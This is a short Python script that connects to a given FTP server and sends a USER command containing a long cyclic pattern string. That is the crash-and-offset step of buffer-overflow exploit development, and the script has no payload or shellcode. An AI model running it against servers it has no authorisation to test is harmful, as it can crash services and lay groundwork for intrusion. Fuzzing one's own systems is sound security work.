import socket
import optparse

def ftpfuzz(host,port):
	st = ('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9'
	'Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9'
	'Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9'
	'Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'
	'Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'
	'Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9'
	'Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9'
	'Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9'
	'Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9'
	'Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9')
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		conn.connect((host,port))
		print ('[+] Connected!') 


	except:
		print ('[-] Connection failed!')
		exit(0)


	res = conn.recv(1024)
	print (str(res))
	print ('[+] Sending buffer...' )
	conn.send('USER ' + st + '\r\n')   




def main():  
	parser = optparse.OptionParser('usage%prog '+'-H <target host> -P <target port>')  
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')  
	parser.add_option('-P', dest='tgtPort', type='int', help='specify target port')  
	(options, args) = parser.parse_args()  
	host = options.tgtHost
	port = options.tgtPort
	if (host == None) | (port == None):   
		print (parser.usage)
		exit(0)
	ftpfuzz(host,port)
	
if __name__ == '__main__':
	main()